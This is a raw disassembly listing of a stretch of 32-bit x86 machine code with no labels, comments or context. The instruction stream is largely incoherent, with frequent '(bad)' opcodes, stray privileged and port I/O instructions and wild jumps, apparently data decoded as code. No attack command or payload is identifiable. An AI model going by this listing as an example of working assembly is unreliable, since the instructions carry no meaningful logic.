  430c75:	add    ch,cl
  430c77:	dec    ebp
  430c78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430c7e:	dec    ebp
  430c7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c85:	jge    0x430c55
  430c87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c8d:	add    cl,dh
  430c8f:	dec    ebp
  430c90:	dec    DWORD PTR [ebx-0x2c031b01]
  430c96:	inc    ebp
  430c97:	push   ebp
  430c98:	dec    DWORD PTR [ebx-0x73ff2734]
  430c9e:	lea    ebx,[ebx-0x7400cdac]
  430ca4:	push   eax
  430ca5:	mov    ah,0x45
  430ca7:	push   ebp
  430ca8:	mov    esi,DWORD PTR [ebx]
  430caa:	les    esi,FWORD PTR [ebx]
  430cac:	add    BYTE PTR [ebx],al
  430cae:	inc    DWORD PTR [ebx]
  430cb0:	mov    ecx,DWORD PTR [edi]
  430cb2:	cld    
  430cb3:	retf   0x4d80
  430cb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430cbc:	jne    0x430c49
  430cbe:	jmp    eax
  430cc0:	ror    bl,1
  430cc2:	or     cl,dh
  430cc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430cca:	not    bl
  430ccc:	adc    al,0xca
  430cce:	inc    ebp
  430ccf:	push   ebp
  430cd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430cd6:	push   0xaf80d6
  430cdb:	mov    eax,DWORD PTR [eax]
  430cdd:	in     al,0xff
  430cdf:	sti    
  430ce0:	sbb    dh,cl
  430ce2:	pop    esi
  430ce3:	xchg   esp,eax
  430ce4:	leave  
  430ce5:	fwait
  430ce6:	add    al,0x32
  430ce8:	push   ebp
  430ce9:	cmp    ebp,esp
  430ceb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430cef:	dec    DWORD PTR [ecx-0x740f0375]
  430cf5:	push   ebp
  430cf6:	cld    
  430cf7:	xor    ebp,ebx
  430cf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430cff:	push   ebp
  430d00:	clc    
  430d01:	xor    esi,ecx
  430d03:	add    esi,DWORD PTR [ebp-0x75]
  430d06:	(bad)  
  430d07:	hlt    
  430d08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430d0f:	mov    DWORD PTR [esi],eax
  430d11:	hlt    
  430d12:	(bad)  
  430d13:	dec    ebp
  430d14:	add    esi,DWORD PTR [ebx]
  430d16:	(bad)  
  430d17:	mov    edx,0xffc68d0a
  430d1c:	add    dl,cl
  430d1e:	leave  
  430d1f:	push   ebp
  430d20:	push   ebp
  430d21:	mov    ebp,esp
  430d23:	fcom   QWORD PTR [ecx+0x7d]
  430d26:	inc    ebp
  430d27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430d2d:	iret   
  430d2e:	cld    
  430d2f:	retf   0x868f
  430d32:	loopne 0x430d31
  430d34:	mov    edi,edi
  430d36:	mov    esi,DWORD PTR [ebp-0x8]
  430d39:	mov    esi,eax
  430d3b:	cld    
  430d3c:	jne    0x430cee
  430d3e:	mov    BYTE PTR [ecx],0xa
  430d41:	add    dh,al
  430d43:	test   DWORD PTR [eax],ecx
  430d45:	inc    esi
  430d47:	inc    DWORD PTR [edi]
  430d49:	mov    eax,esi
  430d4b:	cld    
  430d4c:	add    DWORD PTR [eax+0x901c6],eax
  430d52:	leave  
  430d53:	xor    BYTE PTR [ebp+0x45],dl
  430d56:	in     al,dx
  430d57:	mov    edx,DWORD PTR [ecx-0x40]
  430d5a:	inc    ebp
  430d5b:	add    BYTE PTR [ecx-0x74000301],cl
  430d61:	int3   
  430d62:	cld    
  430d63:	jne    0x430d1d
  430d65:	call   0xcc2070
  430d6a:	mov    esi,DWORD PTR [ebp-0x8]
  430d6d:	test   eax,esi
  430d6f:	je     0x430de6
  430d71:	mov    eax,esi
  430d73:	cld    
  430d74:	add    al,0x80
  430d76:	add    WORD PTR [ecx+0x0],ax
  430d7a:	fiadd  DWORD PTR [eax]
  430d7c:	mov    BYTE PTR [eax],0x3d
  430d7f:	push   0xffffffc3
  430d81:	push   esi
  430d82:	mov    edx,DWORD PTR [eax+0x51]
  430d85:	pop    edi
  430d86:	lea    ebx,[ebx-0x8]
  430d89:	ret    0x45
  430d8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d92:	xchg   eax,edi
  430d94:	mov    DWORD PTR [ebp-0x75],ecx
  430d97:	push   esi
  430d98:	clc    
  430d99:	jne    0x430d6b
  430d9b:	mov    ecx,0xf8450b0b
  430da0:	(bad)  
  430da1:	push   cs
  430da2:	or     BYTE PTR [ebp-0x3a],dh
  430da5:	cmp    eax,DWORD PTR [ecx]
  430da7:	pop    esi
  430da8:	(bad)  
  430da9:	or     al,0x5
  430dab:	inc    eax
  430dac:	leave  
  430dad:	jmp    0x40cf:0x25564204
  430db4:	leave  
  430db5:	in     eax,dx
  430db6:	inc    DWORD PTR [eax-0x75]
  430db9:	fimul  DWORD PTR [ebx-0x228139be]
  430dbf:	inc    eax
  430dc0:	nop
  430dc1:	loopne 0x430dc2
  430dc3:	ret    
  430dc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430dca:	add    eax,0xff45e8f8
  430dcf:	push   esi
  430dd0:	push   DWORD PTR [ebp-0x39]
  430dd3:	mov    eax,0x7edda46
  430dd8:	or     al,0x6
  430dda:	push   DWORD PTR [ebp-0x3a]
  430ddd:	cmp    eax,DWORD PTR [edx]
  430ddf:	pop    esi
  430de0:	ret    
  430de1:	or     al,0x56
  430de3:	inc    ecx
  430de4:	push   ebp
  430de5:	jle    0x430dd3
  430de7:	inc    edx
  430de8:	inc    ebp
  430de9:	int    0x1
  430deb:	inc    ecx
  430dec:	sub    BYTE PTR ds:0xe77541fc,ah
  430df2:	add    DWORD PTR [edx+0x1c],eax
  430df5:	retf   0xc38b
  430df8:	adc    al,0x8b
  430dfa:	xchg   edx,eax
  430dfb:	push   ecx
  430dfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430e02:	rcl    DWORD PTR [esi-0x9],cl
  430e05:	jne    0x430e57
  430e07:	mov    eax,0x7c80ece
  430e0c:	rol    DWORD PTR [esi],cl
  430e0e:	div    DWORD PTR [ebp+0x50]
  430e11:	cmp    ecx,edx
  430e13:	pop    esi
  430e14:	dec    BYTE PTR [edx]
  430e16:	in     al,dx
  430e17:	inc    edx
  430e18:	sub    esp,ecx
  430e1a:	inc    eax
  430e1b:	(bad)  
  430e1c:	push   eax
  430e1d:	add    edx,DWORD PTR [eax-0x1f]
  430e20:	push   edi
  430e21:	add    dh,dh
  430e23:	leave  
  430e24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430e28:	add    BYTE PTR [ecx+0x0],dl
  430e2b:	inc    ebp
  430e2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430e32:	add    BYTE PTR [eax-0x7fbf448],bh
  430e38:	add    al,0x2
  430e3a:	jmp    0x57eb994
  430e3f:	jne    0x430e29
  430e41:	mov    eax,DWORD PTR [edx]
  430e43:	or     BYTE PTR [eax],al
  430e45:	inc    ecx
  430e46:	stc    
  430e47:	in     eax,dx
  430e48:	ss inc eax
  430e4a:	aas    
  430e4b:	out    0x7d,eax
  430e4d:	inc    ecx
  430e4e:	mov    ebp,ecx
  430e50:	lock ret 0x7d
  430e54:	and    ecx,DWORD PTR [ebx-0x171777]
  430e5a:	add    bh,bh
  430e5c:	aad    0xd7
  430e5e:	add    dh,cl
  430e60:	clts   
  430e62:	(bad)  
  430e63:	call   0xffce0d68
  430e68:	hlt    
  430e69:	iret   
  430e6a:	jge    0x430e42
  430e6c:	rol    DWORD PTR [esi-0x80],cl
  430e6f:	jmp    0x1c5d7c
  430e74:	out    dx,al
  430e75:	mov    eax,DWORD PTR [ebx]
  430e77:	(bad)  
  430e78:	pop    esi
  430e79:	push   es
  430e7a:	cmp    al,0xe8
  430e7c:	sar    edi,0x8
  430e7f:	inc    DWORD PTR [edi]
  430e81:	inc    esi
  430e82:	(bad)  
  430e83:	loopne 0x430f03
  430e85:	push   edi
  430e86:	push   cs
  430e87:	push   ebx
  430e88:	add    BYTE PTR [ebx+0x24008b56],cl
  430e8e:	add    BYTE PTR [ebp+0x50],al
  430e91:	push   eax
  430e92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e98:	sub    edx,DWORD PTR [esi-0x24]
  430e9b:	jne    0x430e53
  430e9d:	lods   eax,DWORD PTR ds:[esi]
  430e9e:	mov    edx,DWORD PTR [edx-0x34]
  430ea1:	dec    esi
  430ea2:	out    0x83,eax
  430ea4:	into   
  430ea5:	push   edi
  430ea7:	loopne 0x430e77
  430ea9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430ead:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430eb4:	rol    DWORD PTR [edx],0x8
  430eb7:	mov    esp,ecx
  430eb9:	cmp    DWORD PTR [ebx],0xc
  430ebc:	mov    esi,0x5001c0
  430ec1:	push   eax
  430ec2:	push   cs
  430ec3:	push   eax
  430ec4:	(bad)  
  430ec5:	sub    edx,edi
  430ec7:	push   esi
  430ec8:	adc    al,0xcb
  430eca:	ins    DWORD PTR es:[edi],dx
  430ecb:	mov    eax,0x203e8
  430ed0:	add    al,ah
  430ed2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ed9:	add    dh,al
  430edb:	add    ah,ch
  430edd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430ee3:	pop    ecx
  430ee4:	or     eax,ebx
  430ee6:	cli    
  430ee7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430eed:	lea    ebp,[ebx]
  430eef:	mov    edx,DWORD PTR [edx-0x4]
  430ef2:	dec    ecx
  430ef3:	inc    ebp
  430ef4:	shr    BYTE PTR [ebx],0x4b
  430ef7:	and    al,0x0
  430ef9:	(bad)  
  430efa:	jne    0x430f41
  430efc:	pop    eax
  430efd:	mov    al,0x5a
  430eff:	call   0x142115e
  430f04:	and    al,0x85
  430f06:	push   edx
  430f07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430f0b:	dec    ebp
  430f0c:	mov    cl,0x23
  430f0e:	jmp    0x430efc
  430f10:	mov    al,0xe7
  430f12:	call   0x1391200
  430f17:	shr    DWORD PTR [eax+ebx*2],cl
  430f1a:	lock (bad) 
  430f1c:	adc    eax,0x757f008d
  430f21:	out    0x58,eax
  430f23:	cmp    al,0x7
  430f25:	pop    edx
  430f26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430f2d:	push   ecx
  430f2e:	cld    
  430f2f:	mov    esi,0x3b0175
  430f34:	and    al,0xb0
  430f36:	xor    BYTE PTR [edx+0x1],0x8b
  430f3a:	add    ah,bh
  430f3c:	mov    edi,DWORD PTR [ebp-0x4]
  430f3f:	psubsw mm7,QWORD PTR [edi]
  430f42:	add    DWORD PTR [ebp+0x0],ebp
  430f45:	rcr    eax,1
  430f47:	mov    edi,ecx
  430f49:	and    eax,DWORD PTR [eax]
  430f4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430f51:	call   0x130123a
  430f56:	add    al,cl
  430f58:	mov    ebp,esi
  430f5a:	aam    0x83
  430f5c:	or     DWORD PTR [ecx],eax
  430f5e:	jne    0x430f51
  430f60:	mov    eax,DWORD PTR [eax]
  430f62:	aam    0x0
  430f64:	dec    ebp
  430f65:	jne    0x430ef2
  430f67:	cmp    ebx,eax
  430f69:	jb     0x430fb8
  430f6b:	jmp    0x430ef8
  430f6d:	mov    ebx,esp
  430f6f:	int3   
  430f70:	dec    ebp
  430f71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f78:	mov    edx,0x8b0a8b
  430f7d:	cmp    ecx,DWORD PTR [eax]
  430f7f:	jb     0x430f58
  430f81:	pop    edx
  430f82:	push   edi
  430f83:	cli    
  430f84:	pop    es
  430f85:	mov    eax,ecx
  430f87:	jb     0x430f8b
  430f89:	add    DWORD PTR [ebx],0xa
  430f8c:	mov    eax,DWORD PTR [ebx]
  430f8e:	int3   
  430f8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f95:	jmp    0x430f22
  430f97:	mov    al,0xe8
  430f99:	call   0x104121b
  430f9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430fa1:	pop    edi
  430fa2:	or     BYTE PTR [ecx-0x73],bl
  430fa5:	pop    ecx
  430fa6:	inc    edi
  430fa7:	xor    al,0xeb
  430fa9:	push   ecx
  430faa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430fb0:	call   0xb210b5
  430fb5:	int3   
  430fb6:	sbb    BYTE PTR [esi],ch
  430fb8:	inc    ebp
  430fb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430fbf:	call   0x9c122e
  430fc4:	or     BYTE PTR [ebx-0x73],dl
  430fc7:	cmp    al,0x47
  430fc9:	mov    al,0x1
  430fcb:	jb     0x430fcd
  430fcd:	mov    al,0x10
  430fcf:	push   eax
  430fd0:	add    al,0x75
  430fd2:	add    BYTE PTR [ebx],ch
  430fd4:	add    ebx,esp
  430fd6:	int3   
  430fd7:	jne    0x430fe9
  430fd9:	movsx  edx,cl
  430fdc:	add    DWORD PTR [eax],eax
  430fde:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430fe5:	mov    gs,edi
  430fe7:	add    BYTE PTR [eax-0x50],ch
  430fea:	add    al,ch
  430fec:	mov    eax,DWORD PTR [ecx]
  430fee:	sub    eax,DWORD PTR [eax]
  430ff0:	jb     0x431067
  430ff2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ff6:	jge    0x430fe0
  430ff8:	add    al,0x1
  430ffa:	add    DWORD PTR [eax],0x0
  430ffd:	jne    0x430fff
  430fff:	je     0x431046
  431001:	mov    eax,DWORD PTR [edi]
  431003:	ror    BYTE PTR [ebp+0x4d],1
  431006:	or     DWORD PTR [ecx+0x4d03d004],0x3
  43100d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431013:	mov    DWORD PTR [ebx],ebp
  431015:	fadd   DWORD PTR [eax+0x75]
  431018:	inc    eax
  431019:	pop    eax
  43101a:	lea    ebx,[ecx+0x4f]
  43101d:	push   0xb1000003
  431022:	out    dx,eax
  431023:	add    ebp,DWORD PTR [edx+edx*2]
  431026:	add    BYTE PTR [ebx+ecx*4],bh
  431029:	mov    ch,BYTE PTR [ebx]
  43102b:	jb     0x43109f
  43102d:	add    al,0x89
  43102f:	push   eax
  431030:	call   0x842b5da2
  431035:	add    DWORD PTR [eax+eax*1],eax
  431038:	jae    0x43104e
  43103a:	icebp  
  43103b:	inc    ebp
  43103c:	mov    eax,DWORD PTR gs:[ecx]
  43103f:	int3   
  431040:	out    dx,al
  431041:	loopne 0x431090
  431043:	sub    eax,DWORD PTR [edx]
  431045:	push   0xffffff83
  431047:	pop    esi
  431048:	push   cs
  431049:	jl     0x431064
  43104b:	add    al,0xaf
  43104d:	xor    eax,0x832b6d00
  431052:	mov    eax,DWORD PTR [edx]
  431054:	rcr    BYTE PTR [ebp+0x754500dc],cl
  43105a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431060:	inc    ebp
  431061:	shr    ebx,0x3
  431064:	or     DWORD PTR [eax],0x4
  431067:	push   0xffffffa5
  431069:	pop    esi
  43106a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431071:	jmp    0x4310d0
  431073:	mov    edi,0xff0272
  431078:	fdivr  QWORD PTR [ebp+0x5d]
  43107b:	push   0x4e
  43107d:	pop    ecx
  43107e:	call   0x435483
  431083:	mov    DWORD PTR [ebx],eax
  431085:	in     al,0xc8
  431087:	rol    BYTE PTR [ebp-0x75],0xc1
  43108b:	call   0xad126c
  431090:	pop    esi
  431091:	enter  0xceff,0x8b
  431095:	repz mov ecx,DWORD PTR [ebp-0x34]
  431099:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4310a0:	je     0x4310a2
  4310a2:	or     DWORD PTR [ebx-0x74183b24],eax
  4310a8:	jne    0x43108e
  4310aa:	jmp    0x4310a5
  4310ac:	push   DWORD PTR [edx-0x24]
  4310af:	push   0x4d
  4310b1:	pop    ecx
  4310b2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4310b6:	jge    0x4310be
  4310b8:	mov    eax,eax
  4310ba:	sub    ebp,DWORD PTR [edx+0x24]
  4310bd:	pop    esi
  4310be:	inc    ebp
  4310bf:	mov    esp,0x8b6077
  4310c4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4310ca:	lods   al,BYTE PTR ds:[esi]
  4310cb:	add    BYTE PTR [ebx],bh
  4310cd:	enter  0xce73,0x49
  4310d1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4310d9:	stc    
  4310da:	jge    0x43114e
  4310dc:	jnp    0xdd42944b
  4310e2:	call   0xc611b8
  4310e7:	fadd   st(0),st
  4310e9:	dec    esi
  4310ea:	ins    BYTE PTR es:[edi],dx
  4310eb:	stc    
  4310ec:	cmp    al,0x73
  4310ee:	push   ebp
  4310ef:	mov    eax,0xf8028b
  4310f4:	jne    0x4310b7
  4310f6:	mov    esi,ecx
  4310f8:	mov    esp,DWORD PTR [ebp+0x2c]
  4310fb:	add    edi,DWORD PTR [ebp-0x24]
  4310fe:	sub    esp,eax
  431100:	and    al,0x45
  431102:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431108:	sbb    al,0xee
  43110a:	pop    esi
  43110b:	call   0x83113b
  431110:	fsubr  st,st(3)
  431112:	sti    
  431113:	add    BYTE PTR gs:[ecx],bh
  431116:	add    eax,esp
  431118:	add    DWORD PTR [esi],eax
  43111a:	rol    DWORD PTR [ebp+0x8],0x29
  43111e:	mov    esp,eax
  431120:	clc    
  431121:	jne    0x431198
  431123:	mov    eax,0x8b0673
  431128:	loopne 0x43116f
  43112a:	loopne 0x4310b5
  43112c:	lods   al,BYTE PTR ds:[esi]
  43112d:	int3   
  43112e:	inc    ebp
  43112f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431133:	add    al,0xc3
  431135:	sub    ecx,DWORD PTR [ebp+0x47]
  431138:	(bad)  
  43113a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43113e:	add    eax,DWORD PTR [eax]
  431140:	call   0x644d245
  431145:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43114b:	dec    esi
  43114c:	ins    DWORD PTR es:[edi],dx
  43114d:	in     al,dx
  43114e:	lea    eax,[eax]
  431150:	inc    ebp
  431151:	inc    ebp
  431152:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431158:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431162:	and    al,0xdc
  431164:	ror    DWORD PTR [edx+0x24],0xf7
  431168:	or     BYTE PTR [ebp+0x4c],dh
  43116b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43116f:	stos   BYTE PTR es:[edi],al
  431170:	adc    edx,edi
  431172:	inc    esp
  431173:	add    edi,DWORD PTR [eax]
  431175:	jne    0x43115a
  431177:	mov    DWORD PTR [eax-0x7449db04],ecx
  43117d:	cmp    ecx,DWORD PTR [edi]
  43117f:	sub    BYTE PTR [ebp-0x7e],dl
  431182:	sar    ebp,0xb
  431185:	jmp    FWORD PTR [edi+0x2400392a]
  43118b:	sub    esi,DWORD PTR [ebx-0x73]
  43118e:	mov    esp,DWORD PTR [ecx+edi*4]
  431191:	mov    ecx,DWORD PTR [eax]
  431193:	and    BYTE PTR [eax],al
  431195:	jne    0x431161
  431197:	sub    ebp,ecx
  431199:	sbb    BYTE PTR [esi+0x32],ah
  43119c:	dec    ebp
  43119d:	push   ebp
  43119e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4311a4:	ret    
  4311a5:	mov    edx,ebp
  4311a7:	leave  
  4311a8:	sub    DWORD PTR [esi+0x24],ebx
  4311ab:	ret    0x2b
  4311ae:	pop    ax
  4311b0:	push   ebp
  4311b1:	rol    BYTE PTR [ebx],0xeb
  4311b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4311bb:	jb     0x431212
  4311bd:	ret    
  4311be:	in     al,dx
  4311bf:	jecxz  0x43114c
  4311c1:	push   esi
  4311c2:	xchg   esp,eax
  4311c3:	jne    0x4311c5
  4311c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4311c8:	jne    0x4311ae
  4311ca:	mov    eax,DWORD PTR [ebp-0x77]
  4311cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4311d4:	mov    esi,DWORD PTR [ebp-0x75]
  4311d7:	pop    esi
  4311d8:	nop
  4311d9:	mov    eax,DWORD PTR [eax]
  4311db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4311e1:	add    al,0x0
  4311e3:	inc    ebp
  4311e4:	mov    eax,DWORD PTR [ebx]
  4311e6:	mov    ebp,ebx
  4311e8:	cmp    al,0xf
  4311ea:	or     al,al
  4311ec:	inc    ebp
  4311ed:	inc    ebp
  4311ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4311f4:	cld    
  4311f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4311fb:	add    BYTE PTR [ecx-0x5],dl
  4311fe:	add    eax,0x17200
  431203:	sbb    al,0x85
  431205:	dec    esp
  431206:	je     0x431240
  431208:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43120c:	add    BYTE PTR [ebx],bh
  43120e:	(bad)  
  43120f:	and    al,0x32
  431211:	jae    0x4311af
  431213:	mov    cl,cl
  431215:	inc    DWORD PTR [esp]
  431218:	push   ebp
  431219:	shr    esp,0x8
  43121c:	in     al,dx
  43121d:	push   esp
  43121e:	add    DWORD PTR [eax],esp
  431220:	add    bl,cl
  431222:	inc    ebp
  431223:	mov    bh,0x89
  431225:	add    ah,bh
  431227:	jmp    0xca752171
  43122c:	pushf  
  43122d:	dec    esp
  43122e:	mov    edx,0xf8178520
  431233:	fst    DWORD PTR [ebp+0x0]
  431236:	mov    BYTE PTR [eax],0xc4
  431239:	sub    edx,DWORD PTR [ebx-0x3f]
  43123c:	inc    ebp
  43123d:	add    eax,0xc601da
  431242:	mov    al,0xc6
  431245:	ins    BYTE PTR es:[edi],dx
  431246:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43124d:	dec    esp
  43124e:	jmp    DWORD PTR [eax]
  431250:	inc    ebp
  431251:	fnstcw WORD PTR [esi+0x29]
  431254:	test   BYTE PTR [eax],0xc8
  431257:	rol    BYTE PTR [eax],0xc0
  43125a:	lea    ecx,[ebp-0x3cf0dbcb]
  431260:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431266:	inc    esi
  431267:	add    DWORD PTR [eax],ebx
  431269:	add    dh,bh
  43126b:	mov    esi,DWORD PTR [edx+0x8]
  43126e:	(bad)  
  43126f:	fdiv   QWORD PTR ss:[ecx]
  431272:	(bad)  
  431273:	mov    bl,ch
  431275:	add    esi,eax
  431277:	add    dh,bl
  431279:	or     esi,eax
  43127b:	mov    dl,0xdf
  43127d:	add    esi,eax
  43127f:	add    al,ah
  431281:	push   cs
  431282:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431289:	or     BYTE PTR [ebx],dh
  43128b:	dec    ecx
  43128c:	lea    eax,[ebx]
  43128e:	xor    eax,0x18fc0fc7
  431293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431294:	repz clc 
  431296:	add    eax,DWORD PTR [ebp+0x46]
  431299:	prefetcht0 BYTE PTR [ecx-0x2]
  43129d:	xor    eax,0x7c60872
  4312a2:	mov    esp,0xbd32c69b
  4312a7:	pop    esi
  4312a8:	mov    cl,0xbe
  4312ab:	or     al,0xc6
  4312ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4312b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4312bb:	add    dh,al
  4312bd:	mov    eax,ebx
  4312bf:	xor    DWORD PTR [ebx],0x35008dbc
  4312c5:	mov    ecx,DWORD PTR [edi]
  4312c7:	sbb    al,0x18
  4312c9:	inc    ebp
  4312ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4312d1:	clc    
  4312d2:	(bad)  
  4312d3:	xor    DWORD PTR [edx-0x64],esi
  4312d6:	lea    ecx,[ecx+0x45ffe838]
  4312dc:	mov    ecx,ebx
  4312de:	fadd   st,st(6)
  4312e0:	dec    ebp
  4312e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4312e7:	out    0x1,eax
  4312e9:	inc    ebp
  4312ea:	lea    ebp,ds:0xc8ffc6ff
  4312f0:	enter  0xa33,0xc6
  4312f4:	push   ebp
  4312f5:	leave  
  4312f6:	(bad)  
  4312f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4312fd:	add    BYTE PTR [ebp+0x44],al
  431300:	mov    eax,esp
  431302:	mov    WORD PTR [esi+0x46398300],?
  431308:	psubusw mm4,QWORD PTR [esi-0x78]
  43130c:	add    BYTE PTR [ebx-0x1303f975],al
  431312:	add    BYTE PTR [ebp+0x1],0xeb
  431316:	add    BYTE PTR [ebp+0x38],al
  431319:	in     eax,dx
  43131a:	inc    ebp
  43131b:	inc    ebp
  43131c:	mov    ebx,ebx
  43131e:	add    BYTE PTR [ebp+0x0],0xec
  431322:	mov    DWORD PTR [ebp-0x41],eax
  431325:	sub    eax,0x2c00454e
  43132a:	ins    DWORD PTR es:[edi],dx
  43132b:	inc    ebp
  43132c:	add    BYTE PTR [esi+0x66],bh
  43132f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431336:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431340:	dec    edi
  431341:	pop    es
  431342:	add    ah,ch
  431344:	mov    DWORD PTR [ebp+0x68],eax
  431347:	in     eax,dx
  431348:	inc    DWORD PTR [ebp-0x7d]
  43134b:	out    0xc0,al
  43134d:	inc    ebp
  43134e:	mov    edx,esp
  431350:	push   0x45
  431352:	(bad)  
  431353:	jmp    0xdf925910
  431358:	add    BYTE PTR [ebp-0x77],al
  43135b:	out    dx,al
  43135c:	ins    BYTE PTR es:[edi],dx
  43135d:	inc    ebp
  43135e:	jmp    edi
  431360:	add    DWORD PTR [ebp-0x14],0x7e
  431364:	mov    esi,esi
  431366:	outs   dx,BYTE PTR ds:[esi]
  431367:	inc    esp
  431368:	(bad)  
  431369:	mov    esp,0x8341b68d
  43136e:	mov    DWORD PTR [esi+0x70],eax
  431371:	fcos   
  431373:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431379:	in     al,dx
  43137a:	jb     0x431301
  43137c:	(bad)  
  43137d:	dec    DWORD PTR [ebx-0x7aba9901]
  431383:	mov    edi,edi
  431385:	fdivr  st,st(7)
  431387:	out    dx,eax
  431388:	rcl    BYTE PTR [ebx],0x66
  43138b:	mov    DWORD PTR [ebp-0xc70075],eax
  431391:	(bad)  
  431392:	std    
  431393:	cmp    eax,DWORD PTR [eax]
  431395:	jne    0x4313fd
  431397:	mov    DWORD PTR [ebp-0xba0048],eax
  43139d:	in     al,dx
  43139e:	outs   dx,BYTE PTR ds:[esi]
  43139f:	pushf  
  4313a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4313a6:	inc    DWORD PTR [ecx]
  4313a8:	inc    DWORD PTR [eax]
  4313aa:	jae    0x4313e4
  4313ac:	add    BYTE PTR [ebp+0x850266],al
  4313b2:	inc    DWORD PTR [ebp-0x1]
  4313b5:	mov    eax,eax
  4313b7:	jl     0x43141f
  4313b9:	add    BYTE PTR [ebp-0x740077],al
  4313bf:	cld    
  4313c0:	dec    eax
  4313c1:	add    BYTE PTR [eax],0x1
  4313c4:	data16 add BYTE PTR [ebp+0x38],al
  4313c8:	mov    eax,0x47c2
  4313cd:	mov    eax,0x824f89
  4313d2:	inc    edi
  4313d3:	mov    DWORD PTR [edx+0x64],ebp
  4313d6:	inc    WORD PTR [ebp-0x75]
  4313da:	(bad)  
  4313db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4313e2:	inc    ebp
  4313e3:	jge    0x4313c4
  4313e5:	add    bh,ah
  4313e7:	lea    ax,[ebp-0x750030]
  4313ee:	add    al,0x46
  4313f1:	jmp    0x40ff:0x8885
  4313f7:	push   DWORD PTR [ebp+0x52]
  4313fa:	lea    eax,[eax]
  4313fc:	shl    BYTE PTR [esi-0x7b],1
  4313ff:	test   esi,edi
  431401:	(bad)  
  431402:	(bad)  
  431403:	inc    DWORD PTR [ebp-0x990140]
  431409:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43140f:	inc    edi
  431410:	push   ecx
  431411:	xor    ax,WORD PTR [ebp-0x8d0045]
  431418:	add    al,al
  43141a:	ret    
  43141b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431422:	push   eax
  431423:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43142a:	add    BYTE PTR [ebx-0x764f8839],al
  431430:	push   DWORD PTR [esi+0x1]
  431433:	inc    DWORD PTR [eax]
  431435:	mov    eax,0xff99ff
  43143a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431440:	jne    0x4313fa
  431442:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43144c:	mov    ecx,0xd74fb8
  431451:	add    cl,al
  431453:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431459:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431460:	(bad)  
  431461:	push   ebp
  431463:	mov    eax,0x8c2789
  431468:	ret    0x6689
  43146b:	adc    BYTE PTR [ebp+0x48],0x8d
  43146f:	add    bh,ah
  431471:	mov    WORD PTR [ebp-0x70],ax
  431475:	(bad)  
  431476:	ret    0x667d
  431479:	or     BYTE PTR [ebp-0x77],dl
  43147c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431483:	loop   0x43140e
